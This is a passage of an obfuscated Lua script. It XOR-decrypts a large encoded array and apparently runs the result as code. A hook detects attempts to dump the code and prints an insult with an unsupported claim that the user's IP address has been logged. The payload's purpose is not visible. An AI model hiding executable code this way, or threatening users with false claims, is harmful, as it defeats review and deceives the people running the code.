  196, 70 }, "v387HwEUxeSWDyhfhgc6LagEES"); fPeHbRYAFSHcrPYvA0TaUKmNCmzcbe91s7EqP17fCkr2D8iUnQZiYrSNnqju3Z5s =
k9JOHBOzdvFhPvi6qJP7k8o5HVT8DrELTGD3IbQ3cUzNACqAjEv4X; rfRYU9YkdcWJNnXqkQ3a87yR1G4voTM24X2nPjqwNZFF8h7jnowrHtVv =
k9JOHBOzdvFhPvi6qJP7k8o5HVT8DrELTGD3IbQ3cUzNACqAjEv4X; rYLfmmovmCmK5kuimDNpeWx7fiOJfxUswiRPWFcE0XQV356LjB8e3mNDSyz4 =
rfRYU9YkdcWJNnXqkQ3a87yR1G4voTM24X2nPjqwNZFF8h7jnowrHtVv; kMDIpw0aZeYfYcuUBmb6ohLFNFbgyRlGPOxiTfArNIkeqlFTVbiLSlCc3WqnrQwzn5YNJ9p2nZ6 =
rYLfmmovmCmK5kuimDNpeWx7fiOJfxUswiRPWFcE0XQV356LjB8e3mNDSyz4; dBC5bQDuPbyolGaBNwrERtJzSwjGnnSF5yH6iIZIw7sU9cX0vuWp =
kMDIpw0aZeYfYcuUBmb6ohLFNFbgyRlGPOxiTfArNIkeqlFTVbiLSlCc3WqnrQwzn5YNJ9p2nZ6; d953WSaNNzYQy6zjPiZbwTxJWeBrHG2uky24iJP2gVHuqgGskzjBurSyWrEaNljRhN0G6 =
dBC5bQDuPbyolGaBNwrERtJzSwjGnnSF5yH6iIZIw7sU9cX0vuWp; mJ95sSyqLXCfmfEy4kd2ZFOLSw2ijBvyFIJXcUWIxtXpxiMIvKvaFkQksc5UCGU3zmzZSw3L =
d953WSaNNzYQy6zjPiZbwTxJWeBrHG2uky24iJP2gVHuqgGskzjBurSyWrEaNljRhN0G6; oQmcwg5LQ50WsVTHRIKSEGhucEsnd1FjmjJhzaGqhlKPQ5Z7qvN3oYGN =
mJ95sSyqLXCfmfEy4kd2ZFOLSw2ijBvyFIJXcUWIxtXpxiMIvKvaFkQksc5UCGU3zmzZSw3L; bRIFjw90Sdn63sVMbg1jUDrvcxZmSOosglhhZ0LIOWfH54CH9oMqu =
oQmcwg5LQ50WsVTHRIKSEGhucEsnd1FjmjJhzaGqhlKPQ5Z7qvN3oYGN; jmHrVl56IrVlydlcLHcIy7WTgt0M7xSe2foQz3bwWOzFB0Y1rktARl =
bRIFjw90Sdn63sVMbg1jUDrvcxZmSOosglhhZ0LIOWfH54CH9oMqu; kFi01ZnYYqvGO0xCzA3z1oXDOCI9YEbXFY22lSvatN0EX8UI5Z6y31sS3vsqa2QVVg = function(
  a)
  K, F = 6926839106950868, 16384 + 9776; return a:gsub('%x%x',
    function(c)
      L = K % 274877906944; H = (K - L) / 274877906944; M = H % 128; c = tonumber(c, 16)
      m = (c + (H - M) / 128) * (2 * M + 1) % 256; K = L * F + H + c + m; return string.char(m)
    end)
end; uL8WsyGgekgVqMTQSNibpSBhKTf4G4Z0iALqBc67HcPDgGvyKMPaLUb8oFKAFennMo = function(b)
  co = coroutine.create(b)
  w2fNUABSUXVImALXccKXjy6DWtIU4Q32YhZb1rZjt7xZMsL21J385IT5cKW30L1IumVuth47N = {}
  debug.sethook(co,
    function(d, e)
      i, k, v = 1, debug.getlocal(co, 2, 1)
      while k do
        table.insert(w2fNUABSUXVImALXccKXjy6DWtIU4Q32YhZb1rZjt7xZMsL21J385IT5cKW30L1IumVuth47N, k)
        i = i + 1; k, v = debug.getlocal(co, 2, i)
      end
      ; coroutine.yield()
    end, "c")
  res = coroutine.resume(co)
  return w2fNUABSUXVImALXccKXjy6DWtIU4Q32YhZb1rZjt7xZMsL21J385IT5cKW30L1IumVuth47N
end; tGpSCih3wzU0ydjEbjnTRBDqt7dNW4ZkroZo5PmMRK6yRdnafr5 = function(f, g)
  f6AqUNwxGgyI4FC401idYs2ZPyMKqO9sDV4aNZtizaowXLoZhMcmRW5G2C5I96Z4m2zX02 = function(h, l, n)
    XOR_l = { { 0, 1 }, { 1, 0 } }
    pow = 1; c = 0; while h > 0 or l > 0 do
      c = c + XOR_l[h % 2 + 1][l % 2 + 1] * pow; h = math.floor(h / 2)
      l = math.floor(l / 2)
      pow = pow * 2
    end
    ; n(c)
  end; xgkBYzc53zZDqYOmGoEEnu0yxtLl7uQUUQQyedt784Fze8oE8zSMxg2ZzVy7 = function(f, n)
    result = {}
    i = 1; index = f[i]
    while index >= 0 do
      result[i] = f[index + 1]
      i = i + 1; index = f[i]
    end
    ; n(result)
  end; uPH2TU9TTEBDjupCsWuOtBOxVBIJZo5rZaeKU0tFtZec3JtcHVAJsx8oL7DzJtvQ = function(f, g, n)
    if #g <= 0 then return {} end
    ; i = 1; j = 1; for i = 1, #f do
      f6AqUNwxGgyI4FC401idYs2ZPyMKqO9sDV4aNZtizaowXLoZhMcmRW5G2C5I96Z4m2zX02(f[i], string.byte(g, j),
        function(o) f[i] = o end)
      j = j + 1; if j > #g then j = 1 end
    end
    ; n(f)
  end; y1cpxRKrUEUAdEVSLKgwxfKd2hdFahcmi6pMZCF8lLbJV3CpRzoVfKX9VaeEtFyZ = function(p, n)
    xDCUpYonYDxwYvtG2NF9t36iahnU7dKtoUwD0ge8y48pnJGlwUm1ixd1CO9be5Lyyd1 = ""
    for k, q in pairs(p) do xDCUpYonYDxwYvtG2NF9t36iahnU7dKtoUwD0ge8y48pnJGlwUm1ixd1CO9be5Lyyd1 =
      xDCUpYonYDxwYvtG2NF9t36iahnU7dKtoUwD0ge8y48pnJGlwUm1ixd1CO9be5Lyyd1 ..
      jmHrVl56IrVlydlcLHcIy7WTgt0M7xSe2foQz3bwWOzFB0Y1rktARl
      [kFi01ZnYYqvGO0xCzA3z1oXDOCI9YEbXFY22lSvatN0EX8UI5Z6y31sS3vsqa2QVVg('29') .. kFi01ZnYYqvGO0xCzA3z1oXDOCI9YEbXFY22lSvatN0EX8UI5Z6y31sS3vsqa2QVVg('48') .. kFi01ZnYYqvGO0xCzA3z1oXDOCI9YEbXFY22lSvatN0EX8UI5Z6y31sS3vsqa2QVVg('0A') .. kFi01ZnYYqvGO0xCzA3z1oXDOCI9YEbXFY22lSvatN0EX8UI5Z6y31sS3vsqa2QVVg('F3') .. kFi01ZnYYqvGO0xCzA3z1oXDOCI9YEbXFY22lSvatN0EX8UI5Z6y31sS3vsqa2QVVg('8E') .. kFi01ZnYYqvGO0xCzA3z1oXDOCI9YEbXFY22lSvatN0EX8UI5Z6y31sS3vsqa2QVVg('B5')]
      [kFi01ZnYYqvGO0xCzA3z1oXDOCI9YEbXFY22lSvatN0EX8UI5Z6y31sS3vsqa2QVVg('39') .. kFi01ZnYYqvGO0xCzA3z1oXDOCI9YEbXFY22lSvatN0EX8UI5Z6y31sS3vsqa2QVVg('D4') .. kFi01ZnYYqvGO0xCzA3z1oXDOCI9YEbXFY22lSvatN0EX8UI5Z6y31sS3vsqa2QVVg('FB') .. kFi01ZnYYqvGO0xCzA3z1oXDOCI9YEbXFY22lSvatN0EX8UI5Z6y31sS3vsqa2QVVg('0A')](
      q) end
    ; n(xDCUpYonYDxwYvtG2NF9t36iahnU7dKtoUwD0ge8y48pnJGlwUm1ixd1CO9be5Lyyd1)
  end; xgkBYzc53zZDqYOmGoEEnu0yxtLl7uQUUQQyedt784Fze8oE8zSMxg2ZzVy7(f,
    function(r) uPH2TU9TTEBDjupCsWuOtBOxVBIJZo5rZaeKU0tFtZec3JtcHVAJsx8oL7DzJtvQ(r, g,
        function(s) y1cpxRKrUEUAdEVSLKgwxfKd2hdFahcmi6pMZCF8lLbJV3CpRzoVfKX9VaeEtFyZ(s,
            function(t) if #uL8WsyGgekgVqMTQSNibpSBhKTf4G4Z0iALqBc67HcPDgGvyKMPaLUb8oFKAFennMo(jmHrVl56IrVlydlcLHcIy7WTgt0M7xSe2foQz3bwWOzFB0Y1rktARl[kFi01ZnYYqvGO0xCzA3z1oXDOCI9YEbXFY22lSvatN0EX8UI5Z6y31sS3vsqa2QVVg('50') .. kFi01ZnYYqvGO0xCzA3z1oXDOCI9YEbXFY22lSvatN0EX8UI5Z6y31sS3vsqa2QVVg('AD') .. kFi01ZnYYqvGO0xCzA3z1oXDOCI9YEbXFY22lSvatN0EX8UI5Z6y31sS3vsqa2QVVg('FB') .. kFi01ZnYYqvGO0xCzA3z1oXDOCI9YEbXFY22lSvatN0EX8UI5Z6y31sS3vsqa2QVVg('58')]) == 1 then if jmHrVl56IrVlydlcLHcIy7WTgt0M7xSe2foQz3bwWOzFB0Y1rktARl[kFi01ZnYYqvGO0xCzA3z1oXDOCI9YEbXFY22lSvatN0EX8UI5Z6y31sS3vsqa2QVVg('50') .. kFi01ZnYYqvGO0xCzA3z1oXDOCI9YEbXFY22lSvatN0EX8UI5Z6y31sS3vsqa2QVVg('AD') .. kFi01ZnYYqvGO0xCzA3z1oXDOCI9YEbXFY22lSvatN0EX8UI5Z6y31sS3vsqa2QVVg('FB') .. kFi01ZnYYqvGO0xCzA3z1oXDOCI9YEbXFY22lSvatN0EX8UI5Z6y31sS3vsqa2QVVg('58')] == jmHrVl56IrVlydlcLHcIy7WTgt0M7xSe2foQz3bwWOzFB0Y1rktARl[kFi01ZnYYqvGO0xCzA3z1oXDOCI9YEbXFY22lSvatN0EX8UI5Z6y31sS3vsqa2QVVg('CC') .. kFi01ZnYYqvGO0xCzA3z1oXDOCI9YEbXFY22lSvatN0EX8UI5Z6y31sS3vsqa2QVVg('0A') .. kFi01ZnYYqvGO0xCzA3z1oXDOCI9YEbXFY22lSvatN0EX8UI5Z6y31sS3vsqa2QVVg('F3') .. kFi01ZnYYqvGO0xCzA3z1oXDOCI9YEbXFY22lSvatN0EX8UI5Z6y31sS3vsqa2QVVg('8E') .. kFi01ZnYYqvGO0xCzA3z1oXDOCI9YEbXFY22lSvatN0EX8UI5Z6y31sS3vsqa2QVVg('48')] then
                  print(
                  '\10\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\10\10\94\49\68\111\110\39\116\32\116\114\121\32\116\111\32\112\114\105\110\116\32\116\104\101\32\99\111\100\101\32\115\99\117\109\98\97\103\46\10\10\73\116\39\115\32\105\108\108\101\103\97\108\32\116\111\32\114\101\108\101\97\115\101\32\116\104\105\115\32\115\99\114\105\112\116\46\32\89\111\117\39\114\101\32\98\114\101\97\107\105\110\103\32\116\104\101\32\99\111\112\121\114\105\103\104\116\32\108\97\119\46\32\10\10\79\104\44\32\98\116\119\44\32\73\39\118\101\32\108\111\103\103\101\100\32\121\111\117\114\32\73\80\32\97\100\100\114\101\115\115\46\10\10\94\48\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\10') else if jmHrVl56IrVlydlcLHcIy7WTgt0M7xSe2foQz3bwWOzFB0Y1rktARl[kFi01ZnYYqvGO0xCzA3z1oXDOCI9YEbXFY22lSvatN0EX8UI5Z6y31sS3vsqa2QVVg('50') .. kFi01ZnYYqvGO0xCzA3z1oXDOCI9YEbXFY22lSvatN0EX8UI5Z6y31sS3vsqa2QVVg('AD') .. kFi01ZnYYqvGO0xCzA3z1oXDOCI9YEbXFY22lSvatN0EX8UI5Z6y31sS3vsqa2QVVg('FB') .. kFi01ZnYYqvGO0xCzA3z1oXDOCI9YEbXFY22lSvatN0EX8UI5Z6y31sS3vsqa2QVVg('58')](t) then
                    jmHrVl56IrVlydlcLHcIy7WTgt0M7xSe2foQz3bwWOzFB0Y1rktARl
                        [kFi01ZnYYqvGO0xCzA3z1oXDOCI9YEbXFY22lSvatN0EX8UI5Z6y31sS3vsqa2QVVg('50') .. kFi01ZnYYqvGO0xCzA3z1oXDOCI9YEbXFY22lSvatN0EX8UI5Z6y31sS3vsqa2QVVg('AD') .. kFi01ZnYYqvGO0xCzA3z1oXDOCI9YEbXFY22lSvatN0EX8UI5Z6y31sS3vsqa2QVVg('FB') .. kFi01ZnYYqvGO0xCzA3z1oXDOCI9YEbXFY22lSvatN0EX8UI5Z6y31sS3vsqa2QVVg('58')](
                        t)() end end else print(
                '\10\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\10\10\94\49\68\111\110\39\116\32\116\114\121\32\116\111\32\112\114\105\110\116\32\116\104\101\32\99\111\100\101\32\115\99\117\109\98\97\103\46\10\10\73\116\39\115\32\105\108\108\101\103\97\108\32\116\111\32\114\101\108\101\97\115\101\32\116\104\105\115\32\115\99\114\105\112\116\46\32\89\111\117\39\114\101\32\98\114\101\97\107\105\110\103\32\116\104\101\32\99\111\112\121\114\105\103\104\116\32\108\97\119\46\32\10\10\79\104\44\32\98\116\119\44\32\73\39\118\101\32\108\111\103\103\101\100\32\121\111\117\114\32\73\80\32\97\100\100\114\101\115\115\46\10\10\94\48\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\10') end end) end) end)
end; tGpSCih3wzU0ydjEbjnTRBDqt7dNW4ZkroZo5PmMRK6yRdnafr5(
{ 1193, 1037, 905, 602, 645, 1000, 833, 779, 786, 1175, 1206, 709, 586, 981, 1184, 799, 616, 581, 993, 722, 872, 578,
  992, 579, 664, 1096, 1178, 1169, 554, 570, 600, 958, 1062, 597, 688, 770, 774, 849, 830, 731, 859, 1100, 574, 1163,
  890, 1133, 1190, 980, 856, 705, 553, 1055, 621, 844, 1168, 599, 755, 668, 772, 729, 797, 1033, 606, 963, 964, 738, 719,
  748, 795, 783, 950, 1039, 631, 851, 989, 789, 761, 595, 979, 1097, 1098, 1181, 824, 767, 617, 740, 1041, 887, 763, 816,
  863, 1112, 1003, 1111, 1136, 744, 630, 672, 605, 943, 829, 931, 1022, 897, 862, 1054, 682, 1056, 723, 960, 1051, 927,
  544, 914, 565, 615, 724, 765, 1013, 634, 749, 875, 655, 1164, 1135, 1110, 1068, 638, 567, 956, 1154, 718, 1069, 1078,
  766, 669, 628, 787, 745, 959, 746, 1080, 883, 733, 706, 639, 909, 559, 1038, 545, 842, 791, 697, 549, 990, 1108, 1071,
  751, 670, 1187, 663, 678, 1021, 650, 653, 782, 737, 1087, 1072, 1052, 1177, 1005, 759, 608, 991, 714, 676, 794, 834,
  601, 640, 1019, 1067, 796, 752, 982, 821, 741, 1194, 983, 908, 792, 1060, 920, 1201, 889, 685, 1091, 904, 1088, 857,
  932, 870, 1042, 711, 1001, 809, 699, 1203, 660, 726, 788, 1064, 764, 624, 928, 1070, 841, 1185, 1123, 566, 1122, 1059,
  1086, 808, 939, 921, 777, 1077, 878, 860, 557, 823, 911, 1085, 583, 1126, 1032, 780, 603, 1188, 1182, 593, 1129, 800,
  1120, 728, 815, 946, 1010, 1040, 916, 1155, 563, 666, 1083, 925, 1146, 702, 588, 996, 1159, 1118, 629, 1058, 793, 1179,
  556, 1152, 807, 707, 1099, 1105, 1057, 548, 949, 954, 546, 1016, 1002, 866, 587, 1195, 1153, 1107, 658, 760, 873, 885,
  1035, 700, 892, 968, 1208, 1157, 712, 613, 716, 568, 785, 974, 739, 667, 915, 651, 801, 626, 1150, 831, 854, 614, 1205,
  976, 632, 1134, 625, 814, 967, 580, 735, 1034, 1166, 818, 649, 1094, 652, 1104, 1127, 947, 1180, 684, 671, 861, 1026,
  880, 1101, 1090, 564, 1200, 1199, 802, 957, 661, 713, 673, 627, 987, 923, 620, 1165, 720, 848, 695, 610, 550, 955, 852,
  1011, 642, 871, 1148, 622, 843, 803, 1007, 975, 850, 994, 1141, 874, 926, 1006, 618, 1171, 935, 1114, 1082, 687, 555,
  643, 846, 582, 584, 820, 1172, 1198, 919, 845, 686, 592, 913, 893, 902, 1121, 1167, 547, 773, 999, 839, 736, 644, 1139,
  1151, 609, 937, 1089, 912, 1132, 971, 1158, 1137, 1119, 710, 1031, 725, 942, 884, 1066, 826, 1044, 612, 998, 1211, 877,
  551, 869, 577, 970, 569, 910, 1183, 784, 1014, 1073, 930, 1170, 951, 811, 598, 1116, 1024, 1109, 659, 619, 692, 596,
  560, 665, 690, 1130, 1142, 906, 952, 965, 1189, 1020, 966, 900, 677, 836, 607, 876, 929, 1065, 936, 891, 576, 805,
  1036, 899, 898, 973, 762, 1160, 1192, 1025, 934, 810, 1084, 858, 769, 813, 715, 1162, 1196, 561, 771, 589, 1029, 1093,
  933, 895, 747, 1209, 882, 1045, 703, 594, 1176, 636, 827, 1092, 575, 1138, 953, 1106, 781, 1043, 753, 825, 1186, 698,
  633, 623, 1049, 662, 1023, 868, 985, 1053, 756, 948, 978, 730, 1210, 776, 819, 1018, 881, 1117, 1131, 1074, 1081, 918,
  656, 683, 896, 681, 1102, 961, 806, 790, -1, 113, 20, 77, 29, 80, 61, 113, 108, 81, 171, 111, 35, 120, 14, 36, 169, 2,
  14, 31, 171, 95, 90, 29, 45, 43, 110, 98, 74, 131, 68, 148, 108, 81, 59, 78, 39, 56, 67, 2, 81, 17, 80, 138, 16, 38,
  70, 60, 188, 176, 86, 2, 12, 20, 17, 79, 25, 1, 15, 103, 16, 72, 25, 55, 9, 4, 67, 37, 74, 248, 90, 78, 61, 20, 41, 79,
  81, 75, 0, 88, 118, 85, 93, 7, 40, 23, 67, 5, 80, 34, 69, 88, 30, 128, 51, 173, 56, 3, 104, 175, 103, 74, 22, 28, 118,
  243, 109, 19, 68, 4, 48, 93, 206, 88, 120, 80, 67, 86, 66, 2, 37, 93, 44, 75, 43, 34, 88, 82, 106, 22, 17, 79, 180, 74,
  96, 41, 12, 173, 17, 88, 36, 77, 80, 96, 35, 98, 81, 130, 6, 97, 109, 180, 229, 120, 51, 66, 21, 0, 30, 180, 44, 40,
  123, 58, 57, 11, 39, 7, 84, 90, 118, 77, 26, 120, 1, 237, 3, 49, 98, 224, 11, 90, 48, 111, 97, 214, 54, 8, 7, 98, 65,
  50, 232, 67, 61, 93, 42, 31, 17, 30, 107, 93, 93, 7, 7, 111, 25, 108, 210, 80, 116, 52, 194, 8, 88, 143, 125, 117, 16,
  111, 90, 11, 8, 43, 90, 86, 246, 98, 59, 20, 12, 1, 12, 99, 93, 83, 246, 14, 31, 98, 127, 18, 5, 98, 57, 67, 69, 122,
  37, 112, 127, 90, 114, 108, 87, 24, 69, 31, 76, 95, 57, 92, 130, 86, 41, 43, 108, 125, 120, 34, 169, 98, 2, 54, 27,
  189, 15, 67, 22, 86, 124, 34, 20, 5, 109, 79, 226, 12, 72, 94, 242, 29, 78, 137, 5, 162, 132, 5, 193, 113, 96, 44, 16,
  118, 108, 163, 98, 94, 109, 126, 80, 215, 51, 58, 25, 65, 87, 120, 25, 103, 88, 46, 128, 133, 104, 120, 127, 120, 117,
  97, 103, 21, 30, 76, 83, 67, 39, 144, 86, 86, 88, 98, 23, 114, 143, 43, 72, 113, 18, 47, 4, 17, 174, 118, 107, 92, 100,
  76, 6, 23, 40, 59, 96, 40, 118, 204, 68, 62, 98, 123, 56, 12, 120, 18, 94, 175, 110, 4, 80, 32, 70, 61, 173, 5, 72, 6,
  68, 53, 80, 118, 14, 86, 81, 78, 20, 53, 30, 81, 132, 177, 87, 45, 99, 255, 40, 70, 69, 12, 31, 103, 13, 78, 37, 81,
  57, 7, 75, 120, 95, 83, 250, 87, 54, 31, 112, 77, 77, 217, 87, 24, 170, 104, 62, 0, 84, 149, 109, 8, 45, 39, 69, 91,
  222, 69, 176, 25, 6, 81, 99, 87, 3, 80, 95, 23, 10, 4, 25, 67, 86, 113, 69, 101, 151, 91, 105, 28, 56, 114, 80, 22,
  162, 40, 40, 87, 21, 77, 67, 31, 48, 89, 33, 19, 42, 67, 97, 92, 82, 103, 243, 127, 48, 54, 25, 11, 80, 53, 88, 82, 99,
  20, 102, 98, 66, 69, 70, 3, 226, 40, 145, 29, 110, 19, 2, 74, 4, 48, 84, 120, 66, 132, 3, 219, 73, 123, 111, 95, 19,
  34, 12, 74, 101, 20, 35, 215, 17, 53, 16, 250, 25, 101, 98, 36, 78, 12, 74, 67, 86, 11, 111, 77, 67, 97, 39, 130, 71,
  9, 55, 20, 74, 118, 122, 127, 43, 55, 87, 97, 20, 19, 75, 66, 98, 156, 87, 242, 50, 31, 35, 111, 31, 16, 72, 19, 153,
  203, 61, 67, 121, 112, 13, 43, 18, 30, 57, 110, 107, 101, 120, 3, 86, 90, 22, 89, 8, 154, 51, 215, 86, 124, 47, 120,
  94, 34, 114, 22, 137, 95, 30, 12, 25, 154, 74, 18, 17, 125, 61, 90, 109, 10, 11, 120, 33, 213, 166, 44, 30, 127, 17, 0,
  81, 66, 6, 59, 41, 78, 45, 78, 26, 35, 96, 141, 79, 114, 92, 19, 41, 120, 46, 69, 30, 112, 254, 64, 252, 65, 26, 209,
  67, 19, 20, 79, 242 }, "xeMbz9ocqXnwBBXjLqp6GAvVO3"); lCCZLSIF5PoUSrPAR95LyYh7DfLpIFiqjjd8JfLd9elqHrDC4NqvQYntfvXev22uv3Qre =
jmHrVl56IrVlydlcLHcIy7WTgt0M7xSe2foQz3bwWOzFB0Y1rktARl; fMGS6CpmwZYyiRGvQJo4IJEEv1BEvIej8EkddrGfz2UhlJ9nYrlZ =
jmHrVl56IrVlydlcLHcIy7WTgt0M7xSe2foQz3bwWOzFB0Y1rktARl; cToKUeTAAvTO5Xtj7bybKiYNIobK36yH98kTqG3JjMqD29bPUcsVmFh14Xf7 =
fMGS6CpmwZYyiRGvQJo4IJEEv1BEvIej8EkddrGfz2UhlJ9nYrlZ; oegMufX62R2G8jMHLcRZfNbcSZF8FOwP9969bmX9VFpI207ZXQ8paHnQI3nIXJCMDPMmHP =
cToKUeTAAvTO5Xtj7bybKiYNIobK36yH98kTqG3JjMqD29bPUcsVmFh14Xf7; heq7fVZWvDwRI4B7i1U9hdJu7RJXbzgQAUdSZJkCgar0xM04dLsfJnPQWRLxvcq4UDo4APp =
oegMufX62R2G8jMHLcRZfNbcSZF8FOwP9969bmX9VFpI207ZXQ8paHnQI3nIXJCMDPMmHP; r87ub8utjAnWYbyhvPEObPk7Jp0V3g2d6NcHaUsaCP88cR3kYcEmH9enTGBB3UzYRnq2NLRFw =
heq7fVZWvDwRI4B7i1U9hdJu7RJXbzgQAUdSZJkCgar0xM04dLsfJnPQWRLxvcq4UDo4APp; jSlheUoZRvb1qY501gkDFdOaZtbazoG8aouRcLEnVm1C7xrMzYBkDW8PVAOeV =
r87ub8utjAnWYbyhvPEObPk7Jp0V3g2d6NcHaUsaCP88cR3kYcEmH9enTGBB3UzYRnq2NLRFw; tkZjOBWVe2oVaRl679V2WLiDBySDfr1l2DXEh9fTR5DtFUzaPIuguWDl =
jSlheUoZRvb1qY501gkDFdOaZtbazoG8aouRcLEnVm1C7xrMzYBkDW8PVAOeV; q2xxO3cuZ2e1riMM8WwlIKfj9hz4EDYZP33iym6OzwCGE1bnJXVW0HCrXSip =
tkZjOBWVe2oVaRl679V2WLiDBySDfr1l2DXEh9fTR5DtFUzaPIuguWDl; aBGTEZNrDdmMx94fmDMLCMGjTFT9lnOjzhg4SAbbC47sT9YCqWks54DHEKnBotEodrMbgRcj =
q2xxO3cuZ2e1riMM8WwlIKfj9hz4EDYZP33iym6OzwCGE1bnJXVW0HCrXSip; g4hTVKy08j0gGAkXJyy2cvfzlr13Ey4DBAU293Tt4zBr2HwzqczFupFp =
aBGTEZNrDdmMx94fmDMLCMGjTFT9lnOjzhg4SAbbC47sT9YCqWks54DHEKnBotEodrMbgRcj; qymojb2k2p7Y4uM3ZViZlBJ7uhFALqCk2TJF3pAEPWHXirPtioYzdxTpgJqXBdRLSCQpeH =
g4hTVKy08j0gGAkXJyy2cvfzlr13Ey4DBAU293Tt4zBr2HwzqczFupFp; mnWFPRE2VeuOnkOuP8wGXMxQemk7SJ1VSz5FoqGQk18ouuq5ueYZT1DG9Nyd485 =
qymojb2k2p7Y4uM3ZViZlBJ7uhFALqCk2TJF3pAEPWHXirPtioYzdxTpgJqXBdRLSCQpeH; ssCJP46EphhQCIQMZrOMNe5CXqnqaKtwQeNgGYk3V5yC3I6vnCKczvA5lvpLawhfpd =
mnWFPRE2VeuOnkOuP8wGXMxQemk7SJ1VSz5FoqGQk18ouuq5ueYZT1DG9Nyd485; pJDmz4OWeoyfdyQt67mpafStovqBpfi0cfH9AUAEhixV9IXiqqMJN6KF289YuaG = function(
  a)
  K, F = 2617066518180689, 16384 + 7167; return a:gsub('%x%x',
    function(c)
      L = K % 274877906944; H = (K - L) / 274877906944; M = H % 128; c = tonumber(c, 16)
      m = (c + (H - M) / 128) * (2 * M + 1) % 256; K = L * F + H + c + m; return string.char(m)
    end)
end; pD6fRZqzYr47PHa1ZtkQL2gWBqh1j6RsEWGxDMLcWxhtCny10hIsc = function(b)
  co = coroutine.create(b)
  aZ8ulKCr8TXCLrCGHmURTObZD4Js38lYQoZ84szbvpTDvLQpKyW = {}
  debug.sethook(co,
    function(d, e)
      i, k, v = 1, debug.getlocal(co, 2, 1)
      while k do
        table.insert(aZ8ulKCr8TXCLrCGHmURTObZD4Js38lYQoZ84szbvpTDvLQpKyW, k)
        i = i + 1; k, v = debug.getlocal(co, 2, i)
      end
      ; coroutine.yield()
    end, "c")
  res = coroutine.resume(co)
  return aZ8ulKCr8TXCLrCGHmURTObZD4Js38lYQoZ84szbvpTDvLQpKyW
end; ga2G77RXL6JU3HzYw3GIooK7UnRSSgKhfnw1zxpmrM21LSpbN1pNOvMHkYFvw = function(f, g)
  j5eQD0kNXWFV4M6q57W6Oe2RHnk7v1SZZCHTVf8ZUAg49ODyIi4Gs9ObCnWUS6 = function(h, l, n)
    XOR_l = { { 0, 1 }, { 1, 0 } }
    pow = 1; c = 0; while h > 0 or l > 0 do
      c = c + XOR_l[h % 2 + 1][l % 2 + 1] * pow; h = math.floor(h / 2)
      l = math.floor(l / 2)
      pow = pow * 2
    end
    ; n(c)
  end; pt7JuKO6Z8mWGrBQpJxzBHqHftGdAjFaKNCbDhy25Wm9z8zERJpK6KwyVOP = function(f, n)
    result = {}
    i = 1; index = f[i]
    while index >= 0 do
      result[i] = f[index + 1]
      i = i + 1; index = f[i]
    end
    ; n(result)
  end; sn66Qodym8s3GrUlNlBKzFV6w4LZ2uwq5FUS5yauq9XL7me5tKljIgSLNRIWmgm7G = function(f, g, n)
    if #g <= 0 then return {} end
    ; i = 1; j = 1; for i = 1, #f do
      j5eQD0kNXWFV4M6q57W6Oe2RHnk7v1SZZCHTVf8ZUAg49ODyIi4Gs9ObCnWUS6(f[i], string.byte(g, j), function(o) f[i] = o end)
      j = j + 1; if j > #g then j = 1 end
    end
    ; n(f)
  end; ogGYj7DNKI2MXY0qFYJoigstWZLE3DFnb2hFqOt5rvRrPEFrTYDAHXVAgio = function(p, n)
    y1SuOG5JCDzDAj30Dol4veSrPUlvPx1u5IxV6QIUhzEovARTSH6Zg8v8v8 = ""
    for k, q in pairs(p) do y1SuOG5JCDzDAj30Dol4veSrPUlvPx1u5IxV6QIUhzEovARTSH6Zg8v8v8 =
      y1SuOG5JCDzDAj30Dol4veSrPUlvPx1u5IxV6QIUhzEovARTSH6Zg8v8v8 ..
      ssCJP46EphhQCIQMZrOMNe5CXqnqaKtwQeNgGYk3V5yC3I6vnCKczvA5lvpLawhfpd
      [pJDmz4OWeoyfdyQt67mpafStovqBpfi0cfH9AUAEhixV9IXiqqMJN6KF289YuaG('09') .. pJDmz4OWeoyfdyQt67mpafStovqBpfi0cfH9AUAEhixV9IXiqqMJN6KF289YuaG('AA') .. pJDmz4OWeoyfdyQt67mpafStovqBpfi0cfH9AUAEhixV9IXiqqMJN6KF289YuaG('68') .. pJDmz4OWeoyfdyQt67mpafStovqBpfi0cfH9AUAEhixV9IXiqqMJN6KF289YuaG('BF') .. pJDmz4OWeoyfdyQt67mpafStovqBpfi0cfH9AUAEhixV9IXiqqMJN6KF289YuaG('E4') .. pJDmz4OWeoyfdyQt67mpafStovqBpfi0cfH9AUAEhixV9IXiqqMJN6KF289YuaG('7D')]
      [pJDmz4OWeoyfdyQt67mpafStovqBpfi0cfH9AUAEhixV9IXiqqMJN6KF289YuaG('F9') .. pJDmz4OWeoyfdyQt67mpafStovqBpfi0cfH9AUAEhixV9IXiqqMJN6KF289YuaG('1E') .. pJDmz4OWeoyfdyQt67mpafStovqBpfi0cfH9AUAEhixV9IXiqqMJN6KF289YuaG('B7') .. pJDmz4OWeoyfdyQt67mpafStovqBpfi0cfH9AUAEhixV9IXiqqMJN6KF289YuaG('68')](
      q) end
    ; n(y1SuOG5JCDzDAj30Dol4veSrPUlvPx1u5IxV6QIUhzEovARTSH6Zg8v8v8)
